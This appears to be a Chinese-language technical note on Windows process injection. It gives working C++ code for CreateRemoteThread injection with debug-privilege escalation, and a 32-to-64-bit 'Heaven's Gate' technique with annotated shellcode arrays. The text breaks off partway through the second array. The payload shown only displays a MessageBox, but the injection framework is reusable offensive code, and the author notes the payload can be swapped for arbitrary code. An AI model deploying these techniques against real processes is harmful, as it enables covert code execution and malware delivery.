\n\n核心思路如下\n\n- 根据进程ID打开进程，获得进程句柄\n- 申请内存空间\n- 写入数据\n- 将内存改为可读可执行(可选)\n- 创建线程\n- 等待线程退出(可选)\n\n**使用到的API**\n\n- OpenProcess\n- VirtualAllocEx\n- WriteProcessMemory\n- VirtualProtectEx\n- CreateRemoteThread\n- WaitForSingleObject\n\n注入模板网上都有。这里贴一下注入函数且带有参数的写法\n\n```c++\n#pragma once  \n#include <windows.h>  \n#include <TlHelp32.h>  \n#include \"stdio.h\"\n\ntypedef struct _RemoteParam {\n\tchar szMsg[12];    //MessageBox函数中显示的字符提示  \n\tDWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\n\n//定义MessageBox类型的函数指针  \ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n\tRemoteParam* pRP = (RemoteParam*)lParam;\n\tPFN_MESSAGEBOX pfnMessageBox;\n\tpfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;\n\tpfnMessageBox(NULL, pRP->szMsg, pRP->szMsg, 0);\n\treturn 0;\n}\n\nbool enableDebugPriv()\n{\n\tHANDLE hToken;\n\tLUID sedebugnameValue;\n\tTOKEN_PRIVILEGES tkp;\n\tif (!OpenProcessToken(GetCurrentProcess(),\n\t\tTOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {\n\t\treturn false;\n\t}\n\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\ttkp.PrivilegeCount = 1;\n\ttkp.Privileges[0].Luid = sedebugnameValue;\n\ttkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\tif (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\treturn true;\n}\n\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tPROCESSENTRY32 pe;\n\tpe.dwSize = sizeof(PROCESSENTRY32);\n\tif (!Process32First(hSnapshot, &pe)) {\n\t\tMessageBoxA(NULL,\n\t\t\t\"The frist entry of the process list has not been copyied to the buffer\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\twhile (Process32Next(hSnapshot, &pe)) {\n\t\tif (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n\t\t\treturn OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n\t\t}\n\t}\n\treturn 0;\n}\n\nint _main()\n{\n\tconst DWORD dwThreadSize = 4096;\n\tDWORD dwWriteBytes = 0;\n\tenableDebugPriv();\n\tHANDLE TargetProc = GetProcessHandleByName(L\"CheckVm.exe\");\n\tif (!TargetProc)\n\t{\n\t\tMessageBoxA(NULL,\n\t\t\t\"Open target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\t//在宿主进程中为线程体开辟一块存储区域  \n\t//在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n\t//其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n\tvoid* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n\t\tdwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tif (!pRemoteThread) {\n\t\tMessageBoxA(NULL, \"Alloc memory in target process failed !\",\n\t\t\t\"notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\t//将线程体拷贝到宿主进程中  \n\tif (!WriteProcessMemory(TargetProc,\n\t\tpRemoteThread, &threadProc, dwThreadSize, 0)) {\n\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\t//定义线程参数结构体变量  \n\tRemoteParam remoteData;\n\tZeroMemory(&remoteData, sizeof(RemoteParam));\n\n\t//填充结构体变量中的成员  \n\tHINSTANCE hUser32 = LoadLibrary(L\"User32.dll\");\n\tremoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, \"MessageBoxA\");\n\tstrcat_s(remoteData.szMsg, \"Hello＼0\");\n\n\t//为线程参数在宿主进程中开辟存储区域  \n\tRemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n\t\tTargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n\tif (!pRemoteParam) {\n\t\tMessageBoxA(NULL, \"Alloc memory failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\t//将线程参数拷贝到宿主进程地址空间中  \n\tif (!WriteProcessMemory(TargetProc,\n\t\tpRemoteParam, &remoteData, sizeof(remoteData), 0)) {\n\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\t//在宿主进程中创建线程  \n\tHANDLE hRemoteThread = CreateRemoteThread(\n\t\tTargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n\t\tpRemoteParam, 0, &dwWriteBytes);\n\tif (!hRemoteThread) {\n\t\tMessageBoxA(NULL, \"Create remote thread failed !\", \"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\tCloseHandle(hRemoteThread);\n\tFreeLibrary(hUser32);\n\treturn 0;\n}\n```\n\n\n\n### 32位->64位\n\n\n\n核心思路如下\n\n- 根据进程ID打开进程，获得进程句柄\n- 申请内存空间\n- 写入数据\n- 将内存改为可读可执行(可选)\n- 创建线程\n- 等待线程退出(可选)\n\n**使用到的API**\n\n- OpenProcess\n- VirtualAllocEx\n- WriteProcessMemory\n- VirtualProtectEx\n- **CreateRemoteThread64**\n- WaitForSingleObject\n\n32位去注入64位进程时`CreateRemoteThread`会调用失败，需要使用64位的接口\n\n先提升到64位汇编，在遍历ntdll.dll中的导出函数 `CreateRemoteThread`\n\n\n\n## 笔记\n\n[32位注入64位参考](https://www.cnblogs.com/HsinTsao/p/7270732.html)\n\n3g大佬代码代码有点问题，有点误导\n\n获取64位代码是32位的汇编，他写的64位的结果，实则是通过遍历ntdll64里面的64位API 实现的\n\n>  在x64系统下的进程是有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，**CS = 0x23**；64位模式时，**CS = 0x33**。\n>\n> 这两种工作模式是可以进行切换的，一般会通过retf指令，一条retf指令等效于以下2条汇编指令\n>\n> `pop ip`\n>\n> `pop cs`\n\n\n\n代码中`CREATETHREADPIC`shellcode是用来得到64位的`CreateRemoteThread`\n\n`EXECPIC`是我通过vs生成的谈拆管理shellcode，可疑调整为任意代码\n\n```c++\n#pragma once  \n#include <windows.h>  \n#include <TlHelp32.h>  \n#include <iostream>\nusing namespace std;\n\n#define CREATETHREADPIC_SIZE 271\nchar CREATETHREADPIC[] = {\n\t/* 0000 */ \"\\x53\"                             /* push ebx                    */\n\t/* 0001 */ \"\\x56\"                             /* push esi                    */\n\t/* 0002 */ \"\\x57\"                             /* push edi                    */\n\t/* 0003 */ \"\\x55\"                             /* push ebp                    */\n\t/* 0004 */ \"\\xe8\\x6c\\x00\\x00\\x00\"             /* call 0x75                   */\n\t/* 0009 */ \"\\x85\\xc0\"                         /* test eax, eax               */\n\t/* 000B */ \"\\x74\\x5d\"                         /* jz 0x6a                     */\n\t/* 000D */ \"\\x48\\x89\\xe6\"                     /* mov rsi, rsp                */\n\t/* 0010 */ \"\\x48\\x83\\xe4\\xf0\"                 /* and rsp, 0xfffffffffffffff0 */\n\t/* 0014 */ \"\\x48\\x83\\xec\\x68\"                 /* sub rsp, 0x68               */\n\t/* 0018 */ \"\\xb8\\xfa\\x80\\x39\\x5e\"             /* mov eax, 0x5e3980fa         */\n\t/* 001D */ \"\\xe8\\x78\\x00\\x00\\x00\"             /* call 0x9a                   */\n\t/* 0022 */ \"\\x48\\x89\\xc3\"                     /* mov rbx, rax                */\n\t/* 0025 */ \"\\x4d\\x31\\xc0\"                     /* xor r8, r8                  */\n\t/* 0028 */ \"\\x48\\x31\\xc0\"                     /* xor rax, rax                */\n\t/* 002B */ \"\\x48\\x89\\x44\\x24\\x50\"             /* mov [rsp+0x50], rax         */\n\t/* 0030 */ \"\\x48\\x89\\x44\\x24\\x48\"             /* mov [rsp+0x48], rax         */\n\t/* 0035 */ \"\\x48\\x89\\x44\\x24\\x40\"             /* mov [rsp+0x40], rax         */\n\t/* 003A */ \"\\x48\\x89\\x44\\x24\\x38\"             /* mov [rsp+0x38], rax         */\n\t/* 003F */ \"\\x48\\x89\\x44\\x24\\x30\"             /* mov [rsp+0x30], rax         */\n\t/* 0044 */ \"\\x8b\\x46\\x24\"                     /* mov eax, [rsi+0x24]         */\n\t/* 0047 */ \"\\x48\\x89\\x44\\x24\\x28\"             /* mov [rsp+0x28], rax         */\n\t/* 004C */ \"\\x8b\\x46\\x20\"                     /* mov eax, [rsi+0x20]         */\n\t/* 004F */ \"\\x48\\x89\\x44\\x24\\x20\"             /* mov [rsp+0x20], rax         */\n\t/* 0054 */ \"\\x44\\x8b\\x4e\\x14\"                 /* mov r9d, [rsi+0x14]         */\n\t/* 0058 */ \"\\xba\\x00\\x00\\x00\\x10\"             /* mov edx, 0x10000000         */\n\t/* 005D */ \"\\x8b\\x4e\\x30\"                     /* mov ecx, [rsi+0x30]         */\n\t/* 0060 */ \"\\xff\\xd3\"                         /* call rbx                    */\n\t/* 0062 */ \"\\x48\\x89\\xf4\"                     /* mov rsp, rsi                */\n\t/* 0065 */ \"\\xe8\\x18\\x00\\x00\\x00\"             /* call 0x82                   */\n\t/* 006A */ \"\\x5d\"                             /* pop rbp                     */\n\t/* 006B */ \"\\x5f\"                             /* pop rdi                     */\n\t/* 006C */ \"\\x5e\"                             /* pop rsi                     */\n\t/* 006D */ \"\\x5b\"                             /* pop rbx                     */\n\t/* 006E */ \"\\xc3\"                             /* ret                         */\n\t/* 006F */ \"\\x31\\xc0\"                         /* xor eax, eax                */\n\t/* 0071 */ \"\\x48\\xf7\\xd8\"                     /* neg eax                     */\n\t/* 0074 */ \"\\xc3\"                             /* ret                         */\n\t/* 0075 */ \"\\xe8\\xf5\\xff\\xff\\xff\"             /* call 0x6f                   */\n\t/* 007A */ \"\\x74\\x05\"                         /* jz 0x81                     */\n\t/* 007C */ \"\\x58\"                             /* pop eax                     */\n\t/* 007D */ \"\\x6a\\x33\"                         /* push 0x33                   */ //将cs修改为0x33\n\t/* 007F */ \"\\x50\"                             /* push eax                    */ //也就能执行64位汇编了\n\t/* 0080 */ \"\\xcb\"                             /* retf                        */\n\t/* 0081 */ \"\\xc3\"                             /* ret                         */\n\t/* 0082 */ \"\\xe8\\xe8\\xff\\xff\\xff\"             /* call 0x6f                   */\n\t/* 0087 */ \"\\x75\\x10\"                         /* jnz 0x99                    */\n\t/* 0089 */ \"\\x58\"                             /* pop rax                     */\n\t/* 008A */ \"\\x83\\xec\\x08\"                     /* sub esp, 0x8                */\n\t/* 008D */ \"\\x89\\x04\\x24\"                     /* mov [rsp], eax              */\n\t/* 0090 */ \"\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00\" /* mov dword [rsp+0x4], 0x23   */\n\t/* 0098 */ \"\\xcb\"                             /* retf                        */\n\t/* 0099 */ \"\\xc3\"                             /* ret                         */\n\t/* 009A */ \"\\x56\"                             /* push rsi                    */\n\t/* 009B */ \"\\x57\"                             /* push rdi                    */\n\t/* 009C */ \"\\x53\"                             /* push rbx                    */\n\t/* 009D */ \"\\x51\"                             /* push rcx                    */\n\t/* 009E */ \"\\x49\\x89\\xc0\"                     /* mov r8, rax                 */\n\t/* 00A1 */ \"\\x6a\\x60\"                         /* push 0x60                   */\n\t/* 00A3 */ \"\\x5e\"                             /* pop rsi                     */\n\t/* 00A4 */ \"\\x65\\x48\\x8b\\x06\"                 /* mov rax, [gs:rsi]           */\n\t/* 00A8 */ \"\\x48\\x8b\\x40\\x18\"                 /* mov rax, [rax+0x18]         */\n\t/* 00AC */ \"\\x4c\\x8b\\x50\\x30\"                 /* mov r10, [rax+0x30]         */\n\t/* 00B0 */ \"\\x49\\x8b\\x6a\\x10\"                 /* mov rbp, [r10+0x10]         */\n\t/* 00B4 */ \"\\x48\\x85\\xed\"                     /* test rbp, rbp               */\n\t/* 00B7 */ \"\\x89\\xe8\"                         /* mov eax, ebp                */\n\t/* 00B9 */ \"\\x74\\x4f\"                         /* jz 0x10a                    */\n\t/* 00BB */ \"\\x4d\\x8b\\x12\"                     /* mov r10, [r10]              */\n\t/* 00BE */ \"\\x8b\\x45\\x3c\"                     /* mov eax, [rbp+0x3c]         */\n\t/* 00C1 */ \"\\x83\\xc0\\x10\"                     /* add eax, 0x10               */\n\t/* 00C4 */ \"\\x8b\\x44\\x05\\x78\"                 /* mov eax, [rbp+rax+0x78]     */\n\t/* 00C8 */ \"\\x48\\x8d\\x74\\x05\\x18\"             /* lea rsi, [rbp+rax+0x18]     */\n\t/* 00CD */ \"\\xad\"                             /* lodsd                       */\n\t/* 00CE */ \"\\x91\"                             /* xchg ecx, eax               */\n\t/* 00CF */ \"\\x67\\xe3\\xde\"                     /* jecxz 0xb0                  */\n\t/* 00D2 */ \"\\xad\"                             /* lodsd                       */\n\t/* 00D3 */ \"\\x4c\\x8d\\x5c\\x05\\x00\"             /* lea r11, [rbp+rax]          */\n\t/* 00D8 */ \"\\xad\"                             /* lodsd                       */\n\t/* 00D9 */ \"\\x48\\x8d\\x7c\\x05\\x00\"             /* lea rdi, [rbp+rax]          */\n\t/* 00DE */ \"\\xad\"                             /* lodsd                       */\n\t/* 00DF */ \"\\x48\\x8d\\x5c\\x05\\x00\"             /* lea rbx, [rbp+rax]          */\n\t/* 00E4 */ \"\\x8b\\x74\\x8f\\xfc\"                 /* mov esi, [rdi+rcx*4-0x4]    */\n\t/* 00E8 */ \"\\x48\\x01\\xee\"                     /* add rsi, rbp                */\n\t/* 00EB */ \"\\x31\\xc0\"                         /* xor eax, eax                */\n\t/* 00ED */ \"\\x99\"                             /* cdq                         */\n\t/* 00EE */ \"\\xac\"                             /* lodsb                       */\n\t/* 00EF */ \"\\x01\\xc2\"                         /* add edx, eax                */\n\t/* 00F1 */ \"\\xc1\\xc2\\x05\"                     /* rol edx, 0x5                */\n\t/* 00F4 */ \"\\xff\\xc8\"                         /* dec eax                     */\n\t/* 00F6 */ \"\\x79\\xf6\"                         /* jns 0xee                    */\n\t/* 00F8 */ \"\\x44\\x39\\xc2\"                     /* cmp edx, r8d                */\n\t/* 00FB */ \"\\xe0\\xe7\"                         /* loopne 0xe4                 */\n\t/* 00FD */ \"\\x75\\xb1\"                         /* jnz 0xb0                    */\n\t/* 00FF */ \"\\x0f\\xb7\\x14\\x4b\"                 /* movzx edx, word [rbx+rcx*2] */\n\t/* 0103 */ \"\\x41\\x8b\\x04\\x93\"                 /* mov eax, [r11+rdx*4]        */\n\t/* 0107 */ \"\\x48\\x01\\xe8\"                     /* add rax, rbp                */\n\t/* 010A */ \"\\x59\"                             /* pop rcx                     */\n\t/* 010B */ \"\\x5b\"                             /* pop rbx                     */\n\t/* 010C */ \"\\x5f\"                             /* pop rdi                     */\n\t/* 010D */ \"\\x5e\"                             /* pop rsi                     */\n\t/* 010E */ \"\\xc3\"                             /* ret                         */\n};\n#define EXECPIC_SIZE 1984\nchar EXECPIC[] = {\n\t/* 0000 */ \"\\x48\\x81\\xec\\xd8\\x00\\x00\\x00\"                     /* sub rsp, 0xd8                            */\n\t/* 0007 */ \"\\x48\\xc7\\x44\\x24\\x78\\x00\\x00\\x00\\x00\"             /* mov qword [rsp+0x78], 0x0                */\n\t/* 0010 */ \"\\x48\\xc7\\x84\\x24\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" /* mov qword [rsp+0x80], 0x0                */\n\t/* 001C */ \"\\x48\\xc7\\x84\\x24\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" /* mov qword [rsp+0xa8], 0x0                */\n\t/* 0028 */ \"\\xb8\\x75\\x00\\x00\\x00\"                             /* mov eax, 0x75                            */\n\t/* 002D */ \"\\x66\\x89\\x44\\x24\\x58\"                             /* mov [rsp+0x58], ax                       */\n\t/* 0032 */ \"\\xb8\\x73\\x00\\x00\\x00\"                             /* mov eax, 0x73                            */\n\t/* 0037 */ \"\\x66\\x89\\x44\\x24\\x5a\"                             /* mov [rsp+0x5a], ax                       */\n\t/* 003C */ \"\\xb8\\x65\\x00\\x00\\x00\"                             /* mov eax, 0x65                            */\n\t/* 0041 */ \"\\x66\\x89\\x44\\x24\\x5c\"                             /* mov [rsp+0x5c], ax                       */\n\t/* 0046 */ \"\\xb8\\x72\\x00\\x00\\x00\"                             /* mov eax, 0x72                            */\n\t/* 004B */ \"\\x66\\x89\\x44\\x24\\x5e\"                             /* mov [rsp+0x5e], ax                       */\n\t/* 0050 */ \"\\xb8\\x33\\x00\\x00\\x00\"                             /* mov eax, 0x33                            */\n\t/* 0055 */ \"\\x66\\x89\\x44\\x24\\x60\"                             /* mov [rsp+0x60], ax                       */\n\t/* 005A */ \"\\xb8\\x32\\x00\\x00\\x00\"                             /* mov eax, 0x32                            */\n\t/* 005F */ \"\\x66\\x89\\x44\\x24\\x62\"                             /* mov [rsp+0x62], ax                       */\n\t/* 0064 */ \"\\xb8\\x2e\\x00\\x00\\x00\"                             /* mov eax, 0x2e                            */\n\t/* 0069 */ \"\\x66\\x89\\x44\\x24\\x64\"                             /* mov [rsp+0x64], ax                       */\n\t/* 006E */ \"\\xb8\\x64\\x00\\x00\\x00\"                             /* mov eax, 0x64                            */\n\t/* 0073 */ \"\\x66\\x89\\x44\\x24\\x66\"                             /* mov [rsp+0x66], ax                       */\n\t/* 0078 */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 007D */ \"\\x66\\x89\\x44\\x24\\x68\"                             /* mov [rsp+0x68], ax                       */\n\t/* 0082 */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 0087 */ \"\\x66\\x89\\x44\\x24\\x6a\"                             /* mov [rsp+0x6a], ax                       */\n\t/* 008C */ \"\\x33\\xc0\"                                         /* xor eax, eax                             */\n\t/* 008E */ \"\\x66\\x89\\x44\\x24\\x6c\"                             /* mov [rsp+0x6c], ax                       */\n\t/* 0093 */ \"\\xc6\\x44\\x24\\x30\\x4d\"                             /* mov byte [rsp+0x30], 0x4d                */\n\t/* 0098 */ \"\\xc6\\x44\\x24\\x31\\x65\"                             /* mov byte [rsp+0x31], 0x65                */\n\t/* 009D */ \"\\xc6\\x44\\x24\\x32\\x73\"                             /* mov byte [rsp+0x32], 0x73                */\n\t/* 00A2 */ \"\\xc6\\x44\\x24\\x33\\x73\"                             /* mov byte [rsp+0x33], 0x73                */\n\t/* 00A7 */ \"\\xc6\\x44\\x24\\x34\\x61\"                             /* mov byte [rsp+0x34], 0x61                */\n\t/* 00AC */ \"\\xc6\\x44\\x24\\x35\\x67\"                             /* mov byte [rsp+0x35], 0x67                */\n\t/* 00B1 */ \"\\xc6\\x44\\x24\\x36\\x65\"                             /* mov byte [rsp+0x36], 0x65                */\n\t/* 00B6 */ \"\\xc6\\x44\\x24\\x37\\x42\"                             /* mov byte [rsp+0x37], 0x42                */\n\t/* 00BB */ \"\\xc6\\x44\\x24\\x38\\x6f\"                             /* mov byte [rsp+0x38], 0x6f                */\n\t/* 00C0 */ \"\\xc6\\x44\\x24\\x39\\x78\"                             /* mov byte [rsp+0x39], 0x78                */\n\t/* 00C5 */ \"\\xc6\\x44\\x24\\x3a\\x41\"                             /* mov byte [rsp+0x3a], 0x41                */\n\t/* 00CA */ \"\\xc6\\x44\\x24\\x3b\\x00\"                             /* mov byte [rsp+0x3b], 0x0                 */\n\t/* 00CF */ \"\\xc6\\x44\\x24\\x40\\x48\"                             /* mov byte [rsp+0x40], 0x48                */\n\t/* 00D4 */ \"\\xc6\\x44\\x24\\x41\\x65\"                             /* mov byte [rsp+0x41], 0x65                */\n\t/* 00D9 */ \"\\xc6\\x44\\x24\\x42\\x6c\"                             /* mov byte [rsp+0x42], 0x6c                */\n\t/* 00DE */ \"\\xc6\\x44\\x24\\x43\\x6c\"                             /* mov byte [rsp+0x43], 0x6c                */\n\t/* 00E3 */ \"\\xc6\\x44\\x24\\x44\\x6f\"                             /* mov byte [rsp+0x44], 0x6f                */\n\t/* 00E8 */ \"\\xc6\\x44\\x24\\x45\\x2e\"                             /* mov byte [rsp+0x45], 0x2e                */\n\t/* 00ED */ \"\\xc6\\x44\\x24\\x46\\x57\"                             /* mov byte [rsp+0x46], 0x57                */\n\t/* 00F2 */ \"\\xc6\\x44\\x24\\x47\\x6f\"                             /* mov byte [rsp+0x47], 0x6f                */\n\t/* 00F7 */ \"\\xc6\\x44\\x24\\x48\\x6c\"                             /* mov byte [rsp+0x48], 0x6c                */\n\t/* 00FC */ \"\\xc6\\x44\\x24\\x49\\x72\"                             /* mov byte [rsp+0x49], 0x72                */\n\t/* 0101 */ \"\\xc6\\x44\\x24\\x4a\\x64\"                             /* mov byte [rsp+0x4a], 0x64                */\n\t/* 0106 */ \"\\xc6\\x44\\x24\\x4b\\x21\"                             /* mov byte [rsp+0x4b], 0x21                */\n\t/* 010B */ \"\\xc6\\x44\\x24\\x4c\\x00\"                             /* mov byte [rsp+0x4c], 0x0                 */\n\t/* 0110 */ \"\\xe8\\x3b\\x05\\x00\\x00\"                             /* call 0x650                               */\n\t/* 0115 */ \"\\x48\\x89\\x84\\x24\\x88\\x00\\x00\\x00\"                 /* mov [rsp+0x88], rax                      */\n\t/* 011D */ \"\\x48\\x83\\xbc\\x24\\x88\\x00\\x00\\x00\\xff\"             /* cmp qword [rsp+0x88], 0xffffffffffffffff */\n\t/* 0126 */ \"\\x75\\x05\"                                         /* jnz 0x12d                                */\n\t/* 0128 */ \"\\xe9\\xd9\\x01\\x00\\x00\"                             /* jmp 0x306                                */\n\t/* 012D */ \"\\x48\\x8b\\x84\\x24\\x88\\x00\\x00\\x00\"                 /* mov rax, [rsp+0x88]                      */\n\t/* 0135 */ \"\\x48\\x89\\x44\\x24\\x28\"                             /* mov [rsp+0x28], rax                      */\n\t/* 013A */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 013F */ \"\\x48\\x89\\x84\\x24\\xb0\\x00\\x00\\x00\"                 /* mov [rsp+0xb0], rax                      */\n\t/* 0147 */ \"\\x48\\x8b\\x84\\x24\\xb0\\x00\\x00\\x00\"                 /* mov rax, [rsp+0xb0]                      */\n\t/* 014F */ \"\\x48\\x63\\x40\\x3c\"                                 /* movsxd rax, dword [rax+0x3c]             */\n\t/* 0153 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 0158 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 015B */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 015E */ \"\\x48\\x89\\x84\\x24\\xb8\\x00\\x00\\x00\"                 /* mov [rsp+0xb8], rax                      */\n\t/* 0166 */ \"\\xb8\\x08\\x00\\x00\\x00\"                             /* mov eax, 0x8                             */\n\t/* 016B */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 016F */ \"\\x48\\x8b\\x8c\\x24\\xb8\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xb8]                      */\n\t/* 0177 */ \"\\x8b\\x84\\x01\\x88\\x00\\x00\\x00\"                     /* mov eax, [rcx+rax+0x88]                  */\n\t/* 017E */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 0183 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 0186 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 0189 */ \"\\x48\\x89\\x44\\x24\\x50\"                             /* mov [rsp+0x50], rax                      */\n\t/* 018E */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 0193 */ \"\\x8b\\x40\\x20\"                                     /* mov eax, [rax+0x20]                      */\n\t/* 0196 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 019B */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 019E */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 01A1 */ \"\\x48\\x89\\x84\\x24\\xc0\\x00\\x00\\x00\"                 /* mov [rsp+0xc0], rax                      */\n\t/* 01A9 */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 01AE */ \"\\x8b\\x40\\x1c\"                                     /* mov eax, [rax+0x1c]                      */\n\t/* 01B1 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 01B6 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 01B9 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 01BC */ \"\\x48\\x89\\x84\\x24\\xa0\\x00\\x00\\x00\"                 /* mov [rsp+0xa0], rax                      */\n\t/* 01C4 */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 01C9 */ \"\\x8b\\x40\\x24\"                                     /* mov eax, [rax+0x24]                      */\n\t/* 01CC */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 01D1 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 01D4 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 01D7 */ \"\\x48\\x89\\x84\\x24\\x98\\x00\\x00\\x00\"                 /* mov [rsp+0x98], rax                      */\n\t/* 01DF */ \"\\xc7\\x44\\x24\\x74\\x88\\xef\\xff\\x6f\"                 /* mov dword [rsp+0x74], 0x6fffef88         */\n\t/* 01E7 */ \"\\xc7\\x44\\x24\\x70\\x7e\\xaa\\x8a\\x3f\"                 /* mov dword [rsp+0x70], 0x3f8aaa7e         */\n\t/* 01EF */ \"\\xc7\\x44\\x24\\x20\\x00\\x00\\x00\\x00\"                 /* mov dword [rsp+0x20], 0x0                */\n\t/* 01F7 */ \"\\xeb\\x0a\"                                         /* jmp 0x203                                */\n\t/* 01F9 */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 01FD */ \"\\xff\\xc0\"                                         /* inc eax                                  */\n\t/* 01FF */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 0203 */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 0208 */ \"\\x8b\\x40\\x18\"                                     /* mov eax, [rax+0x18]                      */\n\t/* 020B */ \"\\x39\\x44\\x24\\x20\"                                 /* cmp [rsp+0x20], eax                      */\n\t/* 020F */ \"\\x0f\\x83\\xf1\\x00\\x00\\x00\"                         /* jae 0x306                                */\n\t/* 0215 */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 0219 */ \"\\x48\\x8b\\x8c\\x24\\xc0\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xc0]                      */\n\t/* 0221 */ \"\\x8b\\x04\\x81\"                                     /* mov eax, [rcx+rax*4]                     */\n\t/* 0224 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 0229 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 022C */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 022F */ \"\\x48\\x89\\x84\\x24\\x90\\x00\\x00\\x00\"                 /* mov [rsp+0x90], rax                      */\n\t/* 0237 */ \"\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x90]                      */\n\t/* 023F */ \"\\xe8\\xac\\x03\\x00\\x00\"                             /* call 0x5f0                               */\n\t/* 0244 */ \"\\x3b\\x44\\x24\\x70\"                                 /* cmp eax, [rsp+0x70]                      */\n\t/* 0248 */ \"\\x75\\x30\"                                         /* jnz 0x27a                                */\n\t/* 024A */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 024E */ \"\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x98]                      */\n\t/* 0256 */ \"\\x0f\\xb7\\x04\\x41\"                                 /* movzx eax, word [rcx+rax*2]              */\n\t/* 025A */ \"\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xa0]                      */\n\t/* 0262 */ \"\\x8b\\x04\\x81\"                                     /* mov eax, [rcx+rax*4]                     */\n\t/* 0265 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 026A */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                  